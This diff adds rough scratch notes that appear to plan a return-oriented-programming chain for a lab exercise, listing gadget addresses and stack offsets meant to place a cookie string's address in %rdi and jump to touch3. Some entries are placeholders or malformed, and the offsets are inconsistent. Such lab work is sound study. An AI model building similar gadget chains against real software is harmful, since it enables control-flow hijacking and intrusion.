@@ -1,0 +1,16 @@
+movq %rsp,%rax 0x401833 <rsp>
+movq %rax,%rdi 0x4017f4	<rsp+8>
+popq %rax      0x4017ee <rsp+16>
+0x??			<rsp+24>
+movl %eax,%edx 0x40183a <rsp+36>
+
+movl %ecx,%esi 0x40186a
+lea  (%rdi,%rsi,1),%rax 0x401820
+
+movq %rsp,%rax 0x401833 <rsp>
+add 0x37 .al   0x401822 <rsp+8> retq
+movq %rax,%rdi 0x4017f4	<rsp+16>
+0x401757  #touch3	<rsp+24>
+....			<rsp+32>
+cookie			<rsp+0x37(55)>
+
